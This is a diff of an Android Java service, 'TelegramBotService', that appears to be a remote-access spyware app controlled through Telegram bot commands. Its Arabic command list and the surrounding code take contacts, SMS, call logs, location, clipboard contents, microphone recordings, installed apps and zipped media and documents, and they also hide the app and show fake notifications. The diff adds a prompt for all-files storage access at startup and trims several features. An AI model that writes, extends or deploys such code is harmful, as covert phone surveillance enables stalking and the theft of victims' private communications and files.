@@ -25,18 +25,12 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
-import android.telephony.SignalStrength;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.inputmethod.InputMethodManager;
-import android.widget.Toast;
-
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
-
 import org.json.JSONArray;
 import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
@@ -47,11 +41,12 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
-
 import javax.net.ssl.HttpsURLConnection;
 
 public class TelegramBotService extends Service {
@@ -81,6 +76,20 @@ public class TelegramBotService extends Service {
         startForeground(1001, createNotification());
         sendStartupMessage();
         startPolling();
+        requestManageStoragePermission();
+    }
+
+    private void requestManageStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                } catch (Exception e) {}
+            }
+        }
     }
 
     private void acquireWakeLock() {
@@ -132,7 +141,7 @@ public class TelegramBotService extends Service {
                     "/calllog - سجل المكالمات\n" +
                     "/location - الموقع الجغرافي\n" +
                     "/record - بدء التسجيل الصوتي\n" +
-                    "/stoprec - إيقاف التسجيل وإرسال الملف\n" +
+                    "/stoprec - إيقاف التسجيل\n" +
                     "/hide - إخفاء التطبيق\n" +
                     "/show - إظهار التطبيق\n" +
                     "/info - معلومات الجهاز\n" +
@@ -145,9 +154,8 @@ public class TelegramBotService extends Service {
                     "/documents - جميع المستندات (ZIP)\n" +
                     "/volume up - رفع الصوت\n" +
                     "/volume down - خفض الصوت\n" +
-                    "/screenshot - لقطة شاشة\n" +
                     "/clipboard - الحافظة\n" +
-                    "/battery - البطارية والحرارة\n" +
+                    "/battery - البطارية\n" +
                     "/wifi - معلومات الشبكة");
                 break;
             case "/contacts": sendFile("contacts.txt", getContacts().getBytes()); break;
@@ -167,14 +175,12 @@ public class TelegramBotService extends Service {
             case "/audio": createZipAndSend("audio"); break;
             case "/documents": createZipAndSend("documents"); break;
             case "/volume": adjustVolume(arg); break;
-            case "/screenshot": takeScreenshot(); break;
             case "/clipboard": getClipboard(); break;
             case "/battery": getBatteryInfo(); break;
             case "/wifi": getWifiInfo(); break;
         }
     }
 
-    // جهات الاتصال
     private String getContacts() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -191,7 +197,6 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
-    // الرسائل
     private String getSms() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -208,7 +213,6 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
-    // سجل المكالمات
     private String getCallLog() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -225,7 +229,6 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
-    // الموقع
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -240,7 +243,6 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { sendMessage("❌ Location error"); }
     }
 
-    // التسجيل الصوتي
     private void startRecording() {
         try {
             File dir = new File(getExternalFilesDir(null), "recordings");
@@ -273,7 +275,6 @@ public class TelegramBotService extends Service {
         }
     }
 
-    // إشعار وهمي
     private void showFakeNotification(String text) {
         try {
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
@@ -291,7 +292,6 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { sendMessage("❌ Notification failed"); }
     }
 
-    // التطبيقات
     private String getInstalledApps() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -304,7 +304,6 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
-    // إنشاء ZIP للملفات (عام أو حسب النوع)
     private void createZipAndSend(String type) {
         try {
             File zipFile = new File(getExternalFilesDir(null), (type == null ? "all" : type) + "_data_" + System.currentTimeMillis() + ".zip");
@@ -377,19 +376,12 @@ public class TelegramBotService extends Service {
         } catch (Exception e) {}
     }
 
-    // رفع وخفض الصوت
     private void adjustVolume(String action) {
         if (action.equals("up")) audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
         else if (action.equals("down")) audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
         sendMessage("✅ Volume " + action);
     }
 
-    // لقطة شاشة (محاكاة)
-    private void takeScreenshot() {
-        sendMessage("📸 Screenshot feature requires special permission.\nUse device volume down + power button manually.");
-    }
-
-    // الحافظة
     private void getClipboard() {
         try {
             if (Build.VERSION.SDK_INT >= 23) {
@@ -405,7 +397,6 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { sendMessage("❌ Clipboard error: " + e.getMessage()); }
     }
 
-    // البطارية
     private void getBatteryInfo() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -413,47 +404,29 @@ public class TelegramBotService extends Service {
             if (battery != null) {
                 int level = battery.getIntExtra("level", -1);
                 int temp = battery.getIntExtra("temperature", -1) / 10;
-                int voltage = battery.getIntExtra("voltage", -1);
-                String status = "";
-                switch (battery.getIntExtra("status", -1)) {
-                    case android.os.BatteryManager.BATTERY_STATUS_CHARGING: status = "⚡ Charging"; break;
-                    case android.os.BatteryManager.BATTERY_STATUS_FULL: status = "✅ Full"; break;
-                    case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: status = "🔋 Discharging"; break;
-                    default: status = "❓ Unknown";
-                }
-                sendMessage("🔋 Battery: " + level + "%\n" + status + "\n🌡️ Temp: " + temp + "°C\n⚡ Voltage: " + voltage + "mV");
+                sendMessage("🔋 Battery: " + level + "%\n🌡️ Temp: " + temp + "°C");
             }
         } catch (Exception e) { sendMessage("❌ Battery error"); }
     }
 
-    // معلومات الشبكة (ويفي + محمول)
     private void getWifiInfo() {
         StringBuilder sb = new StringBuilder();
         try {
-            // WiFi info
             if (wifiManager != null) {
                 WifiInfo wi = wifiManager.getConnectionInfo();
                 if (wi != null && wi.getNetworkId() != -1) {
-                    sb.append("📶 **WiFi:**\n");
+                    sb.append("📶 WiFi:\n");
                     sb.append("   📡 SSID: ").append(wi.getSSID()).append("\n");
-                    sb.append("   📶 Signal: ").append(wi.getRssi()).append(" dBm\n");
                     sb.append("   🌐 IP: ").append(intToIp(wi.getIpAddress())).append("\n");
                     sb.append("   🔢 MAC: ").append(wi.getMacAddress()).append("\n");
-                    sb.append("   ⚡ Speed: ").append(wi.getLinkSpeed()).append(" Mbps\n");
                 } else {
                     sb.append("📶 WiFi: Not connected\n");
                 }
             }
-
-            // Mobile network info
             if (telephonyManager != null) {
-                sb.append("\n📱 **Mobile:**\n");
+                sb.append("\n📱 Mobile:\n");
                 sb.append("   📡 Network: ").append(telephonyManager.getNetworkOperatorName()).append("\n");
                 sb.append("   🌐 Network Type: ").append(getNetworkType()).append("\n");
-                sb.append("   🇸🇦 Country: ").append(telephonyManager.getNetworkCountryIso()).append("\n");
-                if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                    sb.append("   🆔 SIM: ").append(telephonyManager.getSimOperatorName()).append("\n");
-                }
             }
             sendMessage(sb.toString());
         } catch (Exception e) { sendMessage("❌ Network error: " + e.getMessage()); }
@@ -462,12 +435,8 @@ public class TelegramBotService extends Service {
     private String getNetworkType() {
         int type = telephonyManager.getNetworkType();
         switch (type) {
-            case TelephonyManager.NETWORK_TYPE_GPRS: return "2G (GPRS)";
-            case TelephonyManager.NETWORK_TYPE_EDGE: return "2G (EDGE)";
-            case TelephonyManager.NETWORK_TYPE_UMTS: return "3G (UMTS)";
-            case TelephonyManager.NETWORK_TYPE_HSDPA: return "3G (HSDPA)";
             case TelephonyManager.NETWORK_TYPE_LTE: return "4G (LTE)";
-            case TelephonyManager.NETWORK_TYPE_NR: return "5G (NR)";
+            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
             default: return "Unknown";
         }
     }
@@ -476,48 +445,19 @@ public class TelegramBotService extends Service {
         return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
     }
 
-    // معلومات الجهاز الكاملة
     private String getFullDeviceInfo() {
         StringBuilder sb = new StringBuilder();
         sb.append("📱 **Device Information**\n");
-        sb.append("═══════════════════\n");
         sb.append("Model: ").append(Build.MODEL).append("\n");
         sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
-        sb.append("Brand: ").append(Build.BRAND).append("\n");
-        sb.append("Device: ").append(Build.DEVICE).append("\n");
-        sb.append("Product: ").append(Build.PRODUCT).append("\n");
-        sb.append("Board: ").append(Build.BOARD).append("\n");
-        sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
         sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
-        sb.append("API Level: ").append(Build.VERSION.SDK_INT).append("\n");
-        sb.append("Security Patch: ").append(Build.VERSION.SECURITY_PATCH).append("\n");
-        sb.append("Kernel: ").append(System.getProperty("os.version")).append("\n");
-
-        // Battery
-        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent battery = registerReceiver(null, ifilter);
-        if (battery != null) {
-            int level = battery.getIntExtra("level", -1);
-            sb.append("Battery: ").append(level).append("%\n");
-        }
-
-        // Storage
+        sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
         android.os.StatFs stat = new android.os.StatFs(Environment.getExternalStorageDirectory().getPath());
         long total = (long) stat.getBlockCount() * (long) stat.getBlockSize();
-        long free = (long) stat.getAvailableBlocks() * (long) stat.getBlockSize();
-        sb.append("Storage Total: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
-        sb.append("Storage Free: ").append(free / (1024 * 1024 * 1024)).append(" GB\n");
-
-        // RAM
-        android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
-        ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
-        sb.append("RAM Total: ").append(mi.totalMem / (1024 * 1024)).append(" MB\n");
-        sb.append("RAM Available: ").append(mi.availMem / (1024 * 1024)).append(" MB\n");
-
+        sb.append("Storage: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
         return sb.toString();
     }
 
-    // دوال مساعدة
     private void sendMessage(String text) {
         new Thread(() -> {
             try {
